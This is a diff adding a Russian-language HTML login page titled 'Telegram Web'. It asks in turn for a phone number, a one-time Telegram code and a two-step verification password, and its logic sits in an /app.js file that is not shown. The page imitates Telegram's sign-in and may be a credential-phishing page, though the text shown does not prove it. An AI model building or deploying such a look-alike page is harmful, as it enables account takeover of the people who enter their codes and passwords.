@@ -1,0 +1,28 @@
+<!doctype html><html lang="ru"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Telegram Web</title>
+<link rel="icon" href="/logo.svg">
+<link rel="stylesheet" href="/style.css">
+</head><body>
+<div class="wrap"><div class="col">
+  <img class="logo" src="/logo.svg" alt="">
+  <h1>Вход в Telegram</h1>
+  <p class="hint" id="hint">Введите номер телефона, чтобы войти в аккаунт.</p>
+
+  <form id="f1">
+    <input id="phone" inputmode="tel" autocomplete="tel" placeholder="+7 999 123-45-67">
+    <button type="submit">Далее</button>
+  </form>
+
+  <form id="f2" hidden>
+    <input id="code" inputmode="numeric" autocomplete="one-time-code" placeholder="Код из Telegram">
+    <button type="submit">Войти</button>
+  </form>
+
+  <form id="f3" hidden>
+    <input id="password" type="password" placeholder="Пароль двухэтапной аутентификации">
+    <button type="submit">Подтвердить</button>
+  </form>
+</div></div>
+<script src="/app.js"></script>
+</body></html>
